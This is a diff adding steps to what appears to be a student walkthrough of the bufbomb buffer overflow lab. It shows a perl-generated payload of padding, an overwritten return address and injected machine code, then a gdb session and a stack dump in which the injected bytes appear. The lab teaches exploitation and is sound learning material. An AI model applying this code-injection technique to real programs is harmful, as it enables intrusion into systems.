@@ -169,5 +169,24 @@ Create the new input file by typing:
 perl -e 'print "61 "x32, "BB "x4, "CC "x4, "DD "x4, "58 33 68 55 ", "c7 05 ec c1 04 08 2d 8c c7 0c 68 12 90 04 08 c3 " ' > hexlevel2_3
 ```
 
+Now create the corresponding raw file and use it as the new input for the bufbomb:
+```
+unix> ./hex2raw < hexlevel2_3 > raw
+unix> gdb bufbomb
+(gdb) break *getbuf+17
+(gdb) run -u quinnliu < raw
+(gdb) x/20x $esp
+```
+
+Gives you:
+```
+(gdb) x/20x $esp
+0x55683318 <_reserved+1037080>: 0x55683328      0x0098db36      0x00aeb32c      0x55683328
+0x55683328 <_reserved+1037096>: 0x61616161      0x61616161      0x61616161      0x61616161
+0x55683338 <_reserved+1037112>: 0x61616161      0x61616161      0x61616161      0x61616161
+0x55683348 <_reserved+1037128>: 0xbbbbbbbb      0xcccccccc      0xdddddddd      0x55683358
+0x55683358 <_reserved+1037144>: 0xc1ec05c7      0x8c2d0804      0x12680cc7      0xc3080490
+```
+
 
 
